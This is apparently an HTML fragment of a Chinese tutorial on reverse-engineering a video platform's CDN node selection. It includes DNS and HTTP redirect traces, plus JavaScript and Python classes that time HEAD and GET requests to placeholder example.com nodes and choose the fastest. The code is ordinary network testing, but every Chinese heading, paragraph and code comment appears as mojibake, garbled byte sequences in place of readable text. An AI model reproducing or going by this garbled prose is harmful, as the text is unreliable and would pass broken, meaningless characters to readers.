      <p>è§†é¢‘å¹³å°ä½¿ç”¨å¤šä¸ª CDN èŠ‚ç‚¹åˆ†å‘å†…å®¹ã€‚é€†å‘èŠ‚ç‚¹é€‰æ‹©é€»è¾‘ï¼Œå¯ä»¥æ‰¾åˆ°æœ€å¿«çš„ä¸‹è½½èŠ‚ç‚¹ã€‚</p>

      <h3 id="é€†å‘æ­¥éª¤-5">é€†å‘æ­¥éª¤</h3>

      <h4 id="1-æŠ“åŒ…åˆ†æ-cdn-è°ƒåº¦">1. æŠ“åŒ…åˆ†æ CDN è°ƒåº¦</h4>

      <p><strong>DNS è§£æ</strong>:</p>

      <pre><code>cdn.example.com -&gt; CNAME -&gt; geo.cdn.example.com
geo.cdn.example.com -&gt; A è®°å½•:
  - 1.2.3.4 (åŒ—äº¬èŠ‚ç‚¹)
  - 5.6.7.8 (ä¸Šæµ·èŠ‚ç‚¹)
  - 9.10.11.12 (å¹¿å·èŠ‚ç‚¹)
</code></pre>

      <p><strong>HTTP é‡å®šå‘</strong>:</p>

      <pre><code>GET /video/abc123.mp4
HTTP/1.1 302 Found
Location: https://bj-cdn01.example.com/video/abc123.mp4
</code></pre>

      <h4 id="2-javascript-èŠ‚ç‚¹é€‰æ‹©é€»è¾‘">2. JavaScript èŠ‚ç‚¹é€‰æ‹©é€»è¾‘</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">class</span><span class="w"> </span><span class="nx">CDNSelector</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">nodes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">            </span><span class="p">{</span><span class="w"> </span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;bj-01&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;https://bj-cdn01.example.com&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">region</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;beijing&#39;</span><span class="w"> </span><span class="p">},</span>
<span class="w">            </span><span class="p">{</span><span class="w"> </span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;sh-01&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;https://sh-cdn01.example.com&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">region</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;shanghai&#39;</span><span class="w"> </span><span class="p">},</span>
<span class="w">            </span><span class="p">{</span><span class="w"> </span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;gz-01&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;https://gz-cdn01.example.com&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">region</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;guangzhou&#39;</span><span class="w"> </span><span class="p">}</span>
<span class="w">        </span><span class="p">];</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">selectedNode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">selectBestNode</span><span class="p">(</span><span class="nx">testFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;/ping.txt&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="cm">/**</span>
<span class="cm">         * èŠ‚ç‚¹é€‰æ‹©ç­–ç•¥:</span>
<span class="cm">         * 1. å¹¶å‘æµ‹è¯•æ‰€æœ‰èŠ‚ç‚¹çš„å»¶è¿Ÿ</span>
<span class="cm">         * 2. é€‰æ‹©å»¶è¿Ÿæœ€ä½çš„èŠ‚ç‚¹</span>
<span class="cm">         * 3. ç¼“å­˜ç»“æœ 5 åˆ†é’Ÿ</span>
<span class="cm">         */</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nb">Promise</span><span class="p">.</span><span class="nx">all</span><span class="p">(</span>
<span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="nx">nodes</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">node</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">testNode</span><span class="p">(</span><span class="nx">node</span><span class="p">,</span><span class="w"> </span><span class="nx">testFile</span><span class="p">))</span>
<span class="w">        </span><span class="p">);</span>

<span class="w">        </span><span class="c1">// æŒ‰å»¶è¿Ÿæ’åº</span>
<span class="w">        </span><span class="nx">results</span><span class="p">.</span><span class="nx">sort</span><span class="p">((</span><span class="nx">a</span><span class="p">,</span><span class="w"> </span><span class="nx">b</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">a</span><span class="p">.</span><span class="nx">latency</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">b</span><span class="p">.</span><span class="nx">latency</span><span class="p">);</span>

<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">selectedNode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">results</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">node</span><span class="p">;</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Selected CDN node: </span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">selectedNode</span><span class="p">.</span><span class="nx">id</span><span class="si">}</span><span class="sb"> (</span><span class="si">${</span><span class="nx">results</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">latency</span><span class="si">}</span><span class="sb">ms)`</span><span class="p">);</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">selectedNode</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">testNode</span><span class="p">(</span><span class="nx">node</span><span class="p">,</span><span class="w"> </span><span class="nx">testFile</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>

<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">node</span><span class="p">.</span><span class="nx">url</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">testFile</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;HEAD&#39;</span><span class="p">,</span>
<span class="w">                </span><span class="nx">cache</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;no-cache&#39;</span>
<span class="w">            </span><span class="p">});</span>

<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">latency</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">start</span><span class="p">;</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">node</span><span class="p">,</span><span class="w"> </span><span class="nx">latency</span><span class="w"> </span><span class="p">};</span>

<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">node</span><span class="p">,</span><span class="w"> </span><span class="nx">latency</span><span class="o">:</span><span class="w"> </span><span class="kc">Infinity</span><span class="w"> </span><span class="p">};</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">getVideoUrl</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">selectedNode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="ne">Error</span><span class="p">(</span><span class="s1">&#39;No CDN node selected&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">selectedNode</span><span class="p">.</span><span class="nx">url</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">path</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="3-å¤š-cdn-æºæ¢æµ‹">3. å¤š CDN æºæ¢æµ‹</h4>

      <p>æŸäº›å¹³å°ä¼šåœ¨ä¸åŒ CDN æä¾›å•†ä¹‹é—´åˆ†å‘:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">discoverCDNSources</span><span class="p">(</span><span class="nx">videoId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="cm">/**</span>
<span class="cm">     * æ¢æµ‹å¤šä¸ªå¯èƒ½çš„ CDN æº</span>
<span class="cm">     */</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">cdnProviders</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="s1">&#39;akamai.example.com&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;cloudflare.example.com&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;cloudfront.example.com&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;fastly.example.com&#39;</span>
<span class="w">    </span><span class="p">];</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">sources</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>

<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">provider</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">cdnProviders</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`https://</span><span class="si">${</span><span class="nx">provider</span><span class="si">}</span><span class="sb">/video/</span><span class="si">${</span><span class="nx">videoId</span><span class="si">}</span><span class="sb">.mp4`</span><span class="p">;</span>

<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;HEAD&#39;</span><span class="w"> </span><span class="p">});</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">ok</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">sources</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
<span class="w">                    </span><span class="nx">provider</span><span class="o">:</span><span class="w"> </span><span class="nx">provider</span><span class="p">,</span>
<span class="w">                    </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="nx">url</span><span class="p">,</span>
<span class="w">                    </span><span class="nx">size</span><span class="o">:</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;Content-Length&#39;</span><span class="p">),</span>
<span class="w">                    </span><span class="nx">server</span><span class="o">:</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;Server&#39;</span><span class="p">)</span>
<span class="w">                </span><span class="p">});</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// è¯¥ CDN ä¸å¯ç”¨</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">sources</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="python-å®ç°-cdn-èŠ‚ç‚¹æµ‹é€Ÿ">Python å®ç° - CDN èŠ‚ç‚¹æµ‹é€Ÿ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">asyncio</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">aiohttp</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">List</span><span class="p">,</span> <span class="n">Dict</span>

<span class="k">class</span><span class="w"> </span><span class="nc">CDNOptimizer</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">cdn_nodes</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="n">Dict</span><span class="p">]):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        cdn_nodes: [</span>
<span class="sd">            {&#39;id&#39;: &#39;bj-01&#39;, &#39;url&#39;: &#39;https://bj-cdn.example.com&#39;},</span>
<span class="sd">            {&#39;id&#39;: &#39;sh-01&#39;, &#39;url&#39;: &#39;https://sh-cdn.example.com&#39;},</span>
<span class="sd">            ...</span>
<span class="sd">        ]</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">cdn_nodes</span> <span class="o">=</span> <span class="n">cdn_nodes</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">best_node</span> <span class="o">=</span> <span class="kc">None</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">test_node_latency</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">node</span><span class="p">,</span> <span class="n">test_file</span><span class="o">=</span><span class="s1">&#39;/ping.txt&#39;</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æµ‹è¯•å•ä¸ªèŠ‚ç‚¹çš„å»¶è¿Ÿ&quot;&quot;&quot;</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">node</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">test_file</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
            <span class="k">async</span> <span class="k">with</span> <span class="n">session</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span> <span class="k">as</span> <span class="n">response</span><span class="p">:</span>
                <span class="n">latency</span> <span class="o">=</span> <span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span><span class="p">)</span> <span class="o">*</span> <span class="mi">1000</span>  <span class="c1"># ms</span>

                <span class="k">return</span> <span class="p">{</span>
                    <span class="s1">&#39;node&#39;</span><span class="p">:</span> <span class="n">node</span><span class="p">,</span>
                    <span class="s1">&#39;latency&#39;</span><span class="p">:</span> <span class="n">latency</span><span class="p">,</span>
                    <span class="s1">&#39;status&#39;</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">status</span><span class="p">,</span>
                    <span class="s1">&#39;server&#39;</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Server&#39;</span><span class="p">,</span> <span class="s1">&#39;Unknown&#39;</span><span class="p">)</span>
                <span class="p">}</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">{</span>
                <span class="s1">&#39;node&#39;</span><span class="p">:</span> <span class="n">node</span><span class="p">,</span>
                <span class="s1">&#39;latency&#39;</span><span class="p">:</span> <span class="nb">float</span><span class="p">(</span><span class="s1">&#39;inf&#39;</span><span class="p">),</span>
                <span class="s1">&#39;status&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
                <span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
            <span class="p">}</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">test_node_bandwidth</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">node</span><span class="p">,</span> <span class="n">test_size_mb</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æµ‹è¯•èŠ‚ç‚¹å¸¦å®½&quot;&quot;&quot;</span>
        <span class="c1"># ä¸‹è½½æµ‹è¯•æ–‡ä»¶ï¼ˆä¾‹å¦‚ 1MBï¼‰</span>
        <span class="n">test_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">node</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">/speedtest/</span><span class="si">{</span><span class="n">test_size_mb</span><span class="si">}</span><span class="s2">mb.bin&quot;</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
            <span class="k">async</span> <span class="k">with</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">test_url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span> <span class="k">as</span> <span class="n">response</span><span class="p">:</span>
                <span class="n">data</span> <span class="o">=</span> <span class="k">await</span> <span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
                <span class="n">duration</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span>

                <span class="c1"># è®¡ç®—å¸¦å®½ (Mbps)</span>
                <span class="n">bandwidth</span> <span class="o">=</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">/</span> <span class="p">(</span><span class="n">duration</span> <span class="o">*</span> <span class="mi">1_000_000</span><span class="p">)</span>

                <span class="k">return</span> <span class="p">{</span>
                    <span class="s1">&#39;node&#39;</span><span class="p">:</span> <span class="n">node</span><span class="p">,</span>
                    <span class="s1">&#39;bandwidth&#39;</span><span class="p">:</span> <span class="n">bandwidth</span><span class="p">,</span>
                    <span class="s1">&#39;duration&#39;</span><span class="p">:</span> <span class="n">duration</span>
                <span class="p">}</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">{</span>
                <span class="s1">&#39;node&#39;</span><span class="p">:</span> <span class="n">node</span><span class="p">,</span>
                <span class="s1">&#39;bandwidth&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
                <span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
            <span class="p">}</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">select_best_node</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="s1">&#39;latency&#39;</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;é€‰æ‹©æœ€ä½³èŠ‚ç‚¹&quot;&quot;&quot;</span>
        <span class="k">async</span> <span class="k">with</span> <span class="n">aiohttp</span><span class="o">.</span><span class="n">ClientSession</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">mode</span> <span class="o">==</span> <span class="s1">&#39;latency&#39;</span><span class="p">:</span>
                <span class="c1"># åŸºäºå»¶è¿Ÿé€‰æ‹©</span>
                <span class="n">tasks</span> <span class="o">=</span> <span class="p">[</span>
                    <span class="bp">self</span><span class="o">.</span><span class="n">test_node_latency</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">node</span><span class="p">)</span>
                    <span class="k">for</span> <span class="n">node</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">cdn_nodes</span>
                <span class="p">]</span>
                <span class="n">results</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">gather</span><span class="p">(</span><span class="o">*</span><span class="n">tasks</span><span class="p">)</span>

                <span class="c1"># æ’åºå¹¶é€‰æ‹©å»¶è¿Ÿæœ€ä½çš„</span>
                <span class="n">results</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="s1">&#39;latency&#39;</span><span class="p">])</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">best_node</span> <span class="o">=</span> <span class="n">results</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;node&#39;</span><span class="p">]</span>

                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Best node (latency): </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">best_node</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
                <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">results</span><span class="p">[:</span><span class="mi">3</span><span class="p">]:</span>  <span class="c1"># æ˜¾ç¤ºå‰ 3 ä¸ª</span>
                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  </span><span class="si">{</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;node&#39;</span><span class="p">][</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;latency&#39;</span><span class="p">]</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2">ms&quot;</span><span class="p">)</span>

            <span class="k">elif</span> <span class="n">mode</span> <span class="o">==</span> <span class="s1">&#39;bandwidth&#39;</span><span class="p">:</span>
                <span class="c1"># åŸºäºå¸¦å®½é€‰æ‹©</span>
                <span class="n">tasks</span> <span class="o">=</span> <span class="p">[</span>
                    <span class="bp">self</span><span class="o">.</span><span class="n">test_node_bandwidth</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">node</span><span class="p">)</span>
                    <span class="k">for</span> <span class="n">node</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">cdn_nodes</span>
                <span class="p">]</span>
                <span class="n">results</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">gather</span><span class="p">(</span><span class="o">*</span><span class="n">tasks</span><span class="p">)</span>

                <span class="c1"># æ’åºå¹¶é€‰æ‹©å¸¦å®½æœ€é«˜çš„</span>
                <span class="n">results</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="s1">&#39;bandwidth&#39;</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">best_node</span> <span class="o">=</span> <span class="n">results</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;node&#39;</span><span class="p">]</span>

                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Best node (bandwidth): </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">best_node</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
                <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">results</span><span class="p">[:</span><span class="mi">3</span><span class="p">]:</span>
                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  </span><span class="si">{</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;node&#39;</span><span class="p">][</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;bandwidth&#39;</span><span class="p">]</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2"> Mbps&quot;</span><span class="p">)</span>

        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">best_node</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_video_url</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">video_path</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–ä½¿ç”¨æœ€ä½³èŠ‚ç‚¹çš„è§†é¢‘ URL&quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">best_node</span><span class="p">:</span>
            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&quot;Please select best node first&quot;</span><span class="p">)</span>

        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">best_node</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">video_path</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="n">cdn_nodes</span> <span class="o">=</span> <span class="p">[</span>
        <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="s1">&#39;bj-01&#39;</span><span class="p">,</span> <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="s1">&#39;https://bj-cdn.example.com&#39;</span><span class="p">},</span>
        <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="s1">&#39;sh-01&#39;</span><span class="p">,</span> <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="s1">&#39;https://sh-cdn.example.com&#39;</span><span class="p">},</span>
        <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="s1">&#39;gz-01&#39;</span><span class="p">,</span> <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="s1">&#39;https://gz-cdn.example.com&#39;</span><span class="p">},</span>
        <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="s1">&#39;sz-01&#39;</span><span class="p">,</span> <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="s1">&#39;https://sz-cdn.example.com&#39;</span><span class="p">},</span>
    <span class="p">]</span>

    <span class="n">optimizer</span> <span class="o">=</span> <span class="n">CDNOptimizer</span><span class="p">(</span><span class="n">cdn_nodes</span><span class="p">)</span>

    <span class="c1"># æ–¹æ³• 1: åŸºäºå»¶è¿Ÿé€‰æ‹©</span>
    <span class="k">await</span> <span class="n">optimizer</span><span class="o">.</span><span class="n">select_best_node</span><span class="p">(</span><span class="n">mode</span><span class="o">=</span><span class="s1">&#39;latency&#39;</span><span class="p">)</span>

    <span class="c1"># æ–¹æ³• 2: åŸºäºå¸¦å®½é€‰æ‹©</span>
    <span class="c1"># await optimizer.select_best_node(mode=&#39;bandwidth&#39;)</span>

    <span class="c1"># è·å–è§†é¢‘ URL</span>
    <span class="n">video_url</span> <span class="o">=</span> <span class="n">optimizer</span><span class="o">.</span><span class="n">get_video_url</span><span class="p">(</span><span class="s1">&#39;/video/abc123.mp4&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Video URL: </span><span class="si">{</span><span class="n">video_url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># è¿è¡Œ</span>
<span class="n">asyncio</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
